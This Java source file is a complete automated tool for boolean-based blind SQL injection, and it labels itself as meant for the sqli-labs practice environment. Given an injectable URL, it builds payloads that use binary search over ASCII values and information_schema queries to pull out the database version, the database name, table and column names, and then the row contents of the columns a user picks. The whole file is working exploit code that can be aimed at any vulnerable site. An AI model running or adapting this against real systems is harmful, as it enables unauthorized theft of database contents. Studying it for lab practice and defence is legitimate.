import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Scanner;

public class BoolInjection {
    private static final String USER_AGENT = "Mozilla/5.0";
    static Scanner scanner = new Scanner(System.in);
    private static String url;

    private static String database;
    private static String table;

    public static void main(String[] args) throws Exception {
        System.out.println("代码仅用于sqli-labs关卡");
        System.out.print("闭合后的URL:");
        url = scanner.nextLine();

        version();
        int len = dbLen();
        dbName(len);
        int tableNum = countTables();
        dbTable(tableNum);

    }

    // 发起Http请求并返回网页源码
    private static String getResponse(String payload) throws Exception {

        URL url = new URL(payload);

        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.setRequestProperty("User-Agent", USER_AGENT);

        if (connection.getResponseCode() == 200) {
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line;
            StringBuilder response = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();

            connection.disconnect();

            return response.toString();
        } else {
            throw new IOException("连接失败");
        }

    }


    // 获取数据库版本
    private static void version() throws Exception {
        StringBuilder ver = new StringBuilder();
        for (int i = 1; i <= 6; i++) {
            for (int j = 0; j < 100; j++) {
                String payload = url + "+and+mid(version()," + i + ",1)=" + j + "+--+";
                String response = getResponse(payload);

                if (response.contains("You are in")) {
                    ver.append(j);
                    break;
                }
            }
        }
        ver = new StringBuilder(ver.toString().replace("0", "."));
        System.out.println("数据库版本为：" + ver);
    }

    // 获取数据库长度
    private static int dbLen() throws Exception {
        int len = 0;
        for (int i = 1; i <= 20; i++) {
            String payload = url + "+and+length(database())=" + i + ";+--+";
            String response = getResponse(payload);

            if (response.contains("You are in")) {
                len = i;
                break;
            }
        }
        return len;
    }


    // 获取数据库名称
    private static void dbName(int len) throws Exception {
        StringBuilder dbName = new StringBuilder();
        for (int i = 1; i <= len; i++) {
            int left = 32, right = 126;
            while (left <= right) {
                int mid = left + ((right - left) >> 1);
                String payload = url + "+and+ascii(substring(database()," + i + ",1))>" + mid + "+--+";
                String response = getResponse(payload);
                if (response.contains("You are in")) {
                    left = mid + 1;
                    continue;
                }

                payload = url + "+and+ascii(substring(database()," + i + ",1))<" + mid + "+--+";
                response = getResponse(payload);
                if (response.contains("You are in")) {
                    right = mid - 1;
                    continue;
                }

                payload = url + "+and+ascii(substring(database()," + i + ",1))=" + mid + "+--+";
                response = getResponse(payload);
                if (response.contains("You are in")) {
                    dbName.append((char) mid);
                    break;
                }
            }
        }
        database = dbName.toString();
        System.out.println("数据库名称：" + database);
    }

    // 数据库中表的数量
    private static int countTables() throws Exception {
        int i = 0;

        while (true) {
            String payload = url + "+and+(SELECT+COUNT(*)+FROM+information_schema.tables+WHERE+table_schema=database())=" + i + "+--+";
            String response = getResponse(payload);

            if (response.contains("You are in")) {
                return i;
            } else {
                i++;
            }
        }
    }

    // 表名
    private static void dbTable(int tableNum) throws Exception {
        StringBuilder tableName = new StringBuilder();
        for (int j = 0; j < tableNum; j++) {
            boolean flag = true;
            int i = 1;
            while (flag) {
                int left = 32;
                int right = 126;

                while (left <= right) {
                    int mid = left + ((right - left) >> 1);
                    String payload = url + "+and+ascii(substr((select+table_name+from+information_schema.tables+"
                            + "where+table_schema=database()+limit+" + j + ",1)," + i + ",1))=0--+";
                    String response = getResponse(payload);

                    if (response.contains("You are in")) {
                        flag = false;
                        tableName.append(",");
                        break;
                    }

                    payload = url + "+and+ascii(substr((select+table_name+from+information_schema.tables+"
                            + "where+table_schema=database()+limit+" + j + ",1)," + i + ",1))>" + mid + "--+";
                    response = getResponse(payload);

                    if (response.contains("You are in")) {
                        left = mid + 1;
                        continue;
                    }

                    payload = url + "+and+ascii(substr((select+table_name+from+information_schema.tables+"
                            + "where+table_schema=database()+limit+" + j + ",1)," + i + ",1))<" + mid + "--+";
                    response = getResponse(payload);

                    if (response.contains("You are in")) {
                        right = mid - 1;
                        continue;
                    }

                    payload = url + "+and+ascii(substr((select+table_name+from+information_schema.tables+"
                            + "where+table_schema=database()+limit+" + j + ",1)," + i + ",1))=" + mid + "--+";
                    response = getResponse(payload);

                    if (response.contains("You are in")) {
                        tableName.append((char) mid);
                        i += 1;
                    }

                }
            }
        }
        String[] tableList = tableName.toString().split(",");
        HashMap<Integer, String> tableMap = new HashMap<>();
        for (int i = 0; i < tableList.length; i++) {
            tableMap.put(i, tableList[i]);
        }

        System.out.println(tableMap);
        int index = scanner.nextInt();
        table = tableMap.get(index);
        getColumns();

    }

    // 获取字段数
    private static void getColumns() throws Exception {
        int index = 0;
        StringBuilder columnNames = new StringBuilder();
        while (true) {
            String payload = url + String.format("+and+(SELECT+COUNT(*)+FROM+information_schema.COLUMNS+WHERE+table_schema=DATABASE()+AND+table_name='%s')=%d+--+", table, index);
            String response = getResponse(payload);
            if (response.contains("You are in")) {
                break;
            } else {
                index++;
            }
        }

        for (int i = 0; i < index; i++) {
            boolean flag = true;
            int j = 1;
            while (flag) {
                int left = 32;
                int right = 126;
                while (left <= right) {
                    int mid = left + ((right - left) >> 1);

                    String payload = url + String.format("+and+ascii(substr((select+column_name+from+information_schema.COLUMNS+where+table_schema=database()+and+table_name='%s'+limit+%s,1),%s,1))=0+--+", table, i, j);
                    String response = getResponse(payload);

                    if (response.contains("You are in")) {
                        flag = false;
                        columnNames.append(",");
                        break;
                    }

                    payload = url + String.format("+and+ascii(substr((select+column_name+from+information_schema.COLUMNS+where+table_schema=database()+and+table_name='%s'+limit+%s,1),%s,1))>%d+--+", table, i, j, mid);
                    response = getResponse(payload);
                    if (response.contains("You are in")) {
                        left = mid + 1;
                        continue;
                    }

                    payload = url + String.format("+and+ascii(substr((select+column_name+from+information_schema.COLUMNS+where+table_schema=database()+and+table_name='%s'+limit+%s,1),%s,1))<%d+--+", table, i, j, mid);
                    response = getResponse(payload);
                    if (response.contains("You are in")) {
                        right = mid - 1;
                        continue;
                    }

                    payload = url + String.format("+and+ascii(substr((select+column_name+from+information_schema.COLUMNS+where+table_schema=database()+and+table_name='%s'+limit+%s,1),%s,1))=%d+--+", table, i, j, mid);
                    response = getResponse(payload);
                    if (response.contains("You are in")) {
                        columnNames.append((char) mid);
                        j++;
                    }
                }
            }
        }
        String[] columnList = columnNames.toString().split(",");
        HashMap<Integer, String> columnMap = new HashMap<>();
        for (int i = 0; i < columnList.length; i++) {
            columnMap.put(i, columnList[i]);
        }
        System.out.println(columnMap);
        System.out.println("选择多个以空格分开");

        Scanner scanner = new Scanner(System.in);
        String str = scanner.nextLine();

        String[] strings = str.split(" ");

        int[] num = new int[strings.length];

        for (int i = 0; i < strings.length; i++) {
            num[i] = Integer.parseInt(String.valueOf(strings[i]));
        }
        ArrayList<String> queryColumn = new ArrayList<>();
        for (int i : num) {
            queryColumn.add(columnList[i]);
        }
        getData(queryColumn);
    }

    private static void getData(ArrayList<String> queryColumn) throws Exception {
        //+and+ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68+--+
        int dataCount = 0;
        for (String s : queryColumn) {
            String payload = url + "+AND+(SELECT+COUNT(" + s + ")+FROM+" + database + "." + table + ")=" + dataCount + "+--+";
            String response = getResponse(payload);

            while (!response.contains("You are in")) {
                dataCount++;
                payload = url + "+AND+(SELECT+COUNT(" + s + ")+FROM+" + database + "." + table + ")=" + dataCount + "+--+";
                response = getResponse(payload);
            }
        }


        for (String s : queryColumn) {
            StringBuilder data = new StringBuilder();
            for (int i = 0; i < dataCount; i++) {
                int j = 1;
                boolean flag = true;
                while (flag) {
                    int left = 32, right = 126;

                    while (left <= right) {
                        int mid = left + ((right - left) >> 1);

                        String payload = url + String.format("+and+ORD(MID((SELECT+IFNULL(CAST(%s+AS+CHAR),0x20)FROM+%s.%s+ORDER+BY+id+LIMIT+%d,1),%d,1))=0+--+", s, database, table, i, j);
                        String response = getResponse(payload);

                        if (response.contains("You are in")) {
                            data.append(",");
                            flag = false;
                            break;
                        }

                        payload = url + String.format("+and+ORD(MID((SELECT+IFNULL(CAST(%s+AS+CHAR),0x20)FROM+%s.%s+ORDER+BY+id+LIMIT+%d,1),%d,1))>%d+--+", s, database, table, i, j, mid);
                        response = getResponse(payload);
                        if (response.contains("You are in")) {
                            left = mid + 1;
                            continue;
                        }

                        payload = url + String.format("+and+ORD(MID((SELECT+IFNULL(CAST(%s+AS+CHAR),0x20)FROM+%s.%s+ORDER+BY+id+LIMIT+%d,1),%d,1))<%d+--+", s, database, table, i, j, mid);
                        response = getResponse(payload);
                        if (response.contains("You are in")) {
                            right = mid - 1;
                            continue;
                        }

                        payload = url + String.format("+and+ORD(MID((SELECT+IFNULL(CAST(%s+AS+CHAR),0x20)FROM+%s.%s+ORDER+BY+id+LIMIT+%d,1),%d,1))=%d+--+", s, database, table, i, j, mid);
                        response = getResponse(payload);
                        if (response.contains("You are in")) {
                            data.append((char) mid);
                            j++;

                        }
                    }
                }
            }
            data.deleteCharAt(data.length() - 1);
            String[] columnList = data.toString().split(",");
            HashMap<Integer, String> dataMap = new HashMap<>();
            for (int i = 0; i < columnList.length; i++) {
                dataMap.put(i, columnList[i]);
            }
            System.out.print(s + ": ");
            System.out.println(dataMap);
        }
    }
}
